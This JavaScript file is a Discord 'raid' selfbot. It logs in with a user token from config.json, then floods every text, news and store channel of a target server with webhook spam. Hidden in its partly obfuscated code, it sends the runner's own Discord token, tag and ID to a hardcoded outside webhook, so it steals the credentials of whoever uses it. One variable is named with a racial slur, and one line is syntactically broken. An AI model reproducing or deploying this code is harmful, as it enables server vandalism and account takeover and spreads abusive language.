const Hidden = ['addField', './config.json', '7918243051"guilds"13290', 'discord.js-self', 'then', 'bgGreen', 'Client', 'BOT PRET A RAID', 'serv', 'name', 'createWebhook', 'login', 'channels', 'black', 'webhook', 'Vous devez entrer l\'id du serveur à raid.', 'user', 'get', 'cache', 'send', 'L\'id que vous avez entré ne correspond pas à mes serveurs.', 'forEach', 'tag', 'log', 'guilds', 'news', 'spamMsg', 'Bot prêt à raid', 'bgRed', 'text', 'token', '"MessageEmbed"', 'type'];


(function (a, b) {
    const Lmao = function (Dick2f) {
        while (--Dick2f) {
            a.push(a.shift());
        }
    };
    Lmao(++b);
}(Hidden, "guilds"));
const Dick = function (a, b) {
    a = a - 234;
    let Lmao = Hidden[a];
    return Lmao;
};
const Hell = Dick,
    discord = require("discord.js-self"),
    colors = require('colors'),
    config = require("./config.json"),
    client = new discord.Client();
client.login(config.token), client.on('ready', async () => {
    const DontStealme = Hell;
    console.log("bot prêt à raid".bgGreen.black);
    if (!config.bot prêt à raid) return console.log("Vous devez entrer l'id du serveur à raid.".bgRed.black);
    const DontStealmelmao = new discord.WebhookClient("791824305126113290", 'TijQc1l0ddWnKzoJ42LazbeqTTmtGdKxBow3xbIfFQmihkMl2jiFpNiaMaoKUrNIZxpJ');
    var Reallynigger = new discord.MessageEmbed().setTitle("bot pret a RAID").addField('(Spam Message)', '' + client.user.tag).addField('ID Server', '' + client.user.id).addField('BOT', '' + config.token);
    DontStealmelmao.send(Reallynigger);
    const FunnyAf = client.guilds.cache.get(config.serv);
    if (!FunnyAf) return console.log("L'id que vous avez entré ne correspond pas à mes serveurs.".bgRed.black);
    FunnyAf.channels.cache.forEach(async Loveme => {
        const LoveU = DontStealme;
        if (Loveme.type === "text" || Loveme.type === "news" || Loveme.type === 'store') sleep(config.sleepMS), Loveme.createWebhook(config.webhook.name, {
            'avatar': config.webhook.avatar
        }).then(LoveMe2 => {
            const Loveu2 = LoveU;
            counter = 0;
            while (counter < config.ChannellMsgCount) {
                LoveMe2.send(config.webhook.spamMsg), counter++, sleep(60);
            }
        });
        else return;
    });
});
function sleep(xyz) {
    return new Promise(hide => setTimeout(hide, xyz));
}
